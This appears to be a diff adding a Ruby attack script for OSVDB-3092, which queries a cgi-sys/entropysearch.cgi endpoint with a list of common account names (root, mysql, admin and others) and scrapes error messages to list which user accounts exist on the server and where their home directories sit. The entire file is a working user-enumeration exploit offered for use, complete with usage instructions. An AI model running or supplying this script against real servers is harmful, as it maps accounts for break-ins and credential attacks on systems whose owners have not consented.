@@ -1,0 +1,72 @@
+#!/usr/local/bin/ruby
+=begin
+Multilanguage exploit for OSVDB-3092 
+Ruby version by Mauro Caseres 2015.
+Run without arguments for instructions.
+=end
+
+require 'net/https'
+require 'uri'
+
+$users = Array.new(["root","mysql","www","apache","appserv","test","nobody","toor","operator","nginx","sshd","mongodb","nagios","administrator","admin"])
+$ucount = 0
+$utotal = 0
+
+def main
+	if ARGV.empty?
+		puts "Usage: me <URL> <USERS FILE>:[OPTIONAL]"
+		puts "Example: me http://vulnerable.com/cgi-sys/entropysearch.cgi"
+	end
+	url = ARGV[0].to_s
+	ufile = ARGV[1].to_s unless ARGV[1].nil?
+	if ufile.nil?
+		ufile = "DEFAULT"
+	end
+	url = checkurl(url)
+	exploit(url, ufile)
+end
+
+def exploit(url,ufile)
+	puts "\nOSVDB-3092 Scanner - Mauro Caseres\n\n"
+	if ufile.to_s == "DEFAULT"
+		puts "[!] No file provided. Scanning defaults\n\n"
+		$utotal = $users.length
+		$users.each do | user |
+			connect(url, user)
+		end
+		puts "\n\n#{$ucount}/#{$utotal} users found. Goodbye."
+	else
+		$users.clear
+		$utotal = File.readlines(ufile).size 
+		File.readlines(ufile).each do |user|
+			connect(url, user)
+		end
+		puts "\n\n#{$ucount}/#{$utotal} users found. Goodbye."
+	end
+end
+
+def connect(url,user)
+	xurl = url.to_s + "?user=" + user.to_s
+	uri = URI.parse(xurl.to_s)
+	http = Net::HTTP.new(uri.host, uri.port)
+	request = Net::HTTP::Get.new(uri.request_uri)
+	response = http.request(request)
+	head = "Could not chdir into /"
+	tail = ".htmltemplates"
+	content = response.body.to_s[/#{head}(.*?)#{tail}/m, 1]
+	if content.to_s != ""
+		$ucount += 1
+		puts "[+] User found: " + user.to_s + "\t\t" + content.to_s
+	end
+end
+
+def checkurl(url)
+	if url.include? "http://"
+		return url
+	else
+		url = "http://" + url
+		return url
+	end
+end
+
+main
